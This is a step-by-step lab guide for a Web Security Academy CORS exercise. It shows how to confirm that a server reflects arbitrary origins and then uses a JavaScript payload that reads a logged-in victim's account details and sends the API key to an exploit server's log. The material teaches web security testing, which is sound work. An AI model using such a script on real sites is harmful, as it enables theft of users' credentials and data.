# 🛡️ Lab Guide: CORS Vulnerability with Basic Origin Reflection

This guide shows how to exploit a **CORS vulnerability** where the server reflects arbitrary origins in the `Access-Control-Allow-Origin` header, allowing unauthorized access to sensitive data like API keys using **Burp Suite**. Let’s dive in! 🚀

---

## 📋 Objective
Exploit a CORS misconfiguration that reflects any origin to retrieve the victim’s API key via a malicious script.

---

## 🛠️ Tools Needed
- **Burp Suite** (with Burp’s browser)
- **Repeater** module in Burp Suite
- **Exploit Server** (provided in the lab environment)
- Basic understanding of CORS and JavaScript payloads

---

## 📝 Step-by-Step Instructions

### 1️⃣ Log In and Capture the Request
- Ensure **Intercept** is off in Burp Suite.
- Use **Burp’s browser** to log in and access your account page.
- In **Proxy > HTTP history**, locate the AJAX request to `/accountDetails`.
- Observe the **Access-Control-Allow-Credentials: true** header, indicating CORS support.
- **Right-click** the request and select **Send to Repeater**.

### 2️⃣ Test for Origin Reflection
- In **Repeater**, add the header:
  ```
  Origin: https://0ade00ab0422509d80950392009b0099.web-security-academy.net/
  ```
- Resubmit the request and check the response.
- **Observation**: The response includes `Access-Control-Allow-Origin: https://0ade00ab0422509d80950392009b0099.web-security-academy.net/`, confirming the server reflects arbitrary origins.

### 3️⃣ Craft the Exploit
- Navigate to the **Exploit Server** in the browser.
- Enter the following HTML, replacing `YOUR-LAB-ID` with your lab-specific URL:
  ```html
  <script>
  var req = new XMLHttpRequest();
      req.onload = reqListener;
      req.open('get','https://0ade00ab0422509d80950392009b0099.web-security-academy.net/accountDetails',true);
      req.withCredentials = true;
      req.send();

      function reqListener() {
          location='/log?key='+this.responseText;
      };
  </script>
  ```
- **Note**: This script makes a cross-origin request to `/accountDetails` and logs the API key to the exploit server.

### 4️⃣ Test and Deliver the Exploit
- Click **View exploit** to verify the exploit works. You should land on the log page with the API key in the URL.
- Go back to the **Exploit Server** and click **Deliver exploit to victim**.
- Access the **Access log**, retrieve the victim’s API key, and submit it to complete the lab.